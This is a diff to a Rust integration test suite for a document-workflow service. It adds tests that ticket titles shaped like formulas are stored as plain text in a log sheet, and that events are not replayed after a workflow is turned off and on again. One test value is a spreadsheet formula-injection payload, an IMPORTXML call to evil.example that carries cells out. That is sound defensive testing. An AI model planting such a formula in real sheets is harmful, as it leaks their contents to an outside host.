@@ -166,13 +166,34 @@ async fn a_merged_ticket_adds_a_row_to_the_log_sheet() {
     assert!(would.contains("add 1 row") && would.contains("P-7") && would.contains("Merged tickets"), "{dry:#}");
     assert_eq!(cells(&env, &reference).await.len(), 1, "a dry run changes nothing");
 
-    let e = NewLogEvent::new("attempt.merged", "a1:merged", "test", merged);
+    let e = NewLogEvent::new("attempt.merged", "a1:merged", "test", merged.clone());
     env.state.store.emit_event(&e, 1).await.unwrap();
     let r = tick_until(&env, "the run", || async { runs_of(&env, &wf).await.into_iter().next() }).await;
     let r = run_ended(&env, r["id"].as_str().unwrap()).await;
     assert_eq!(r["status"], "succeeded", "{r:#}");
     assert_eq!(step(&r, "log")["output"]["range"], "A2:E2", "{r:#}");
     assert_eq!(cells(&env, &reference).await[1], ["P-7", "Faster boards", "p-7-faster", "12", "detected"]);
+
+    // A title that reads as a formula (a ticket drafted from an outside issue, say) is written as text.
+    let evil = r#"=IMPORTXML("https://evil.example/?"&A1:A99, "//a")"#;
+    let mut second = merged.clone();
+    second["ticketKey"] = json!("P-8");
+    second["ticketTitle"] = json!(evil);
+    second["attemptId"] = json!("a2");
+    let e = NewLogEvent::new("attempt.merged", "a2:merged", "test", second);
+    env.state.store.emit_event(&e, 2).await.unwrap();
+    let all = tick_until(&env, "two runs", || async {
+        let runs = runs_of(&env, &wf).await;
+        (runs.len() == 2).then(|| json!(runs))
+    })
+    .await;
+    for r in all.as_array().unwrap() {
+        assert_eq!(run_ended(&env, r["id"].as_str().unwrap()).await["status"], "succeeded");
+    }
+    let DocumentContent::Sheet { sheets, .. } = env.fake.read(&reference).await.unwrap() else { panic!("a sheet") };
+    let title = &sheets[0].rows[2][1];
+    assert_eq!((sheets[0].rows[2][0].value.as_str(), title.value.as_str()), ("P-8", evil));
+    assert_eq!(title.formula, None, "never a live formula");
 }
 
 #[tokio::test]
@@ -366,4 +387,67 @@ async fn the_steps_create_write_chart_and_comment() {
     let r = run_ended(&env, r["runId"].as_str().unwrap()).await;
     assert_eq!(r["status"], "failed", "{r:#}");
     assert!(r["error"].as_str().unwrap_or_default().contains("Notes is not a spreadsheet"), "{r:#}");
+}
+
+/// Turning a workflow off and on again (or unlinking a document and linking it back) starts nothing for what happened
+/// while nothing watched: the next look only records again.
+#[tokio::test]
+async fn what_happens_while_nothing_watches_is_not_replayed() {
+    let env = setup().await;
+    let (doc_id, reference) = document(&env, "Design", "doc", &env.project).await;
+    let doc = json!({"name": "Watch", "nodes": [
+        {"id": "commented", "kind": "document.comment_added", "version": 1},
+        {"id": "changed", "kind": "document.changed", "version": 1},
+        {"id": "end", "kind": "end", "version": 1, "config": {"quiet": true}},
+    ], "edges": [{"from": "commented", "to": "end"}, {"from": "changed", "to": "end"}]});
+    let wf = workflow(&env, json!({"doc": doc, "scope": "project", "projectId": env.project, "enabled": true})).await;
+    let enable = |on: bool| set_enabled(&env, &wf, on);
+    let refresh = || pdt_api::documents::watch::refresh(&env.state);
+    let edit = |text: &'static str| append(&env, &doc_id, text);
+    refresh().await;
+
+    // Off: a comment and an edit while nothing watches.
+    enable(false).await;
+    refresh().await;
+    env.fake.add_comment(&reference, "Sam", "While it was off.");
+    edit("Off.").await;
+    enable(true).await;
+    refresh().await;
+    assert!(events(&env, "document.comment_added").await.is_empty(), "nothing replayed");
+    assert!(events(&env, "document.changed").await.is_empty(), "nothing replayed");
+
+    // Unlinked from the project, then linked back: the same.
+    let link = json!({"projectId": env.project});
+    let (s, v) = call(&env.app, "DELETE", &format!("/api/documents/{doc_id}/links"), Some(link.clone())).await;
+    assert!(s.is_success(), "{v}");
+    refresh().await;
+    env.fake.add_comment(&reference, "Sam", "While it was unlinked.");
+    let (s, v) = call(&env.app, "POST", &format!("/api/documents/{doc_id}/links"), Some(link)).await;
+    assert!(s.is_success(), "{v}");
+    refresh().await;
+    assert!(events(&env, "document.comment_added").await.is_empty(), "nothing replayed");
+
+    // What comes once it watches again is new.
+    env.fake.add_comment(&reference, "Sam", "Now.");
+    edit("Now.").await;
+    refresh().await;
+    let comments = events(&env, "document.comment_added").await;
+    assert_eq!(comments.len(), 1, "{comments:#?}");
+    assert_eq!(comments[0]["payload"]["body"], "Now.");
+    assert_eq!(events(&env, "document.changed").await.len(), 1);
+    for _ in 0..3 {
+        pdt_api::run_workflows(&env.state).await;
+    }
+    assert_eq!(runs_of(&env, &wf).await.len(), 2, "one for the comment, one for the change");
+}
+
+async fn set_enabled(env: &Env, wf: &str, on: bool) {
+    let (s, w) = call(&env.app, "PATCH", &format!("/api/workflows/{wf}"), Some(json!({"enabled": on}))).await;
+    assert_eq!(s, StatusCode::OK, "{w}");
+}
+
+async fn append(env: &Env, doc: &str, text: &str) {
+    let body = json!({"edits": [{"op": "append_text", "markdown": text}]});
+    let (s, v) = call(&env.app, "POST", &format!("/api/documents/{doc}/edits"), Some(body)).await;
+    assert_eq!(s, StatusCode::OK, "{v}");
 }
